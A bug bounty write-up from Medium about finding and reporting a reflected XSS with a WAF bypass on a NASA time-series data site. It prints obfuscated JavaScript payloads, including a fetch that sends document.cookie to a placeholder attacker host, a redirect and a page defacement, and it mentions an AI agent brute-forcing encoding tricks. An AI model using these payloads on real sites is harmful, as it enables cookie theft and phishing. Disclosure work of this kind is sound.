# Killed by a Browser, Revived by a Backslash

- **Source URL:** https://medium.com/@cfmohammed24/killed-by-a-browser-revived-by-a-backslash-8baa64c30b28
- **Fetched from:** https://medium.com/@cfmohammed24/killed-by-a-browser-revived-by-a-backslash-8baa64c30b28?source=rss-b4f8c4ee8e35------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14968 (id 14968)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** starkwizzer / Mon, 02 Nov 2026 17:50:33 GMT

It all started with me trying to find my first valid bug, and as everyone suggests, i chose NASA as my first target.

So i started my recon, found 2,800 alive web apps, and started going through them one by one.

I have spent almost 20 days hunting on NASA just finding Self-XSS or unconfirmed/unreportable bugs, just as i was almost about to give up, i decided to revisit a domain that I’d already tested.

This site lets researchers browse, correlate, plot, and download time-series data from dozens of past and current spacecraft missions simultaneously.

So i followed the workflow to see what happens, turns out, its a 3-stage search/query mechanism

eval1 chooses one a topic to search, eval2 chooses the dataset and eval3 preload builds the query and sends it with some modifications and eval3 itself shows the results.

Only interesting one is the preloading one because, unlike the others, the request (Either POST’s body, or GET’s Query parameters) reflects in a function call

And funny enough, when editing the request in burp to include a single quote ' it reflects and breaks out of the string. BINGO, thats it, thats a Reflected XSS.

And now that we confirmed GET also works i just need to copy the link.

Well, unfortunately, it only works in burp (and burp’s show response in browser) because normal browsers url-encode the parameters and the encoded ' reflects encoded and does not get decoded.

This Kills it, all browsers url-encode so no use in it, i tried to do a POST with content-type: text/plain but the cgi-lib does not know/wasnt configured to handle this

So this means this is a dead end, you cant get a normal user to visit a link without it breaking, right?

Out of options, i decided to see how far I could push it anyway. At least to see if i could do something.

document.domain worked fine, but swapping in cookie got blocked. That’s how I confirmed the WAF was signature-matching specific words, not just blocking script execution outright. Testing further, I found it also flagged location (to stop window.location) and blocked backticks and ${} to prevent template literals. The WAF was also so strict about other characters (space, +, =, \[\], !), and HTML-Like tags.

I found a clever way to move around them that you might like:

`Reflect.get(window,unescape('%6c%6f%63%61%74%69%6f%6e')).assign('https://ATTACKER/');//`
2\. Bypassing document.cookie using atob to encode cookie as base64 to bypass the check

`fetch('https://ATTACKER/?'.concat(Reflect.get(document,atob('Y29va2ll'))));//`
**3. Bypassing HTML/keyword filtering using String.fromCodePoint to inject and deface the page**

`(()=>{document.body.insertAdjacentHTML('afterbegin',String.fromCodePoint(60,104,50,62,80,119,110,101,100,33,60,47,104,50,62))})(),`
This decodes to \<h2>Pwned!\</h2>, inserted at the very top of the page via insertAdjacentHTML('afterbegin', ...).

So i have everything i need, i just cant get it to work in a browser. *That’s when I started throwing encoding tricks at an AI agent to brute-force a way around it*…

After a while it screamed at me saying I FOUND IT, \x27 decodes to ' in the response. That was it, the missing piece. This solved the encoding issue, as we can just use \x27 and the browser will not encode it.

At this point, I had a confirmed path to cookie theft, open redirects, and injecting a fake SSO page under a trusted NASA.gov certificate, all from a reflected query string.

I reported this to NASA through their Bugcrowd VDP, confirmed reflected XSS, a WAF bypass, and a working phishing PoC under their own certificate. It came back rated P4. I’ve requested a review citing their own VRT, since reflected XSS with a documented WAF bypass and credential-harvesting impact typically sits at P3, but as of writing this, I’m still waiting to hear back.

Regardless of where the severity lands, this was a good reminder that a WAF is not a fix, it’s a filter, and filters only block what they’re told to look for. Every bypass here worked for the same reason: encode what’s blocked, decode it somewhere the filter isn’t watching.

This was my first confirmed bug on a real program, and if a 20-day dry spell and a dead-end payload taught me anything, it’s that “dead” usually just means you haven’t found the right encoding yet.
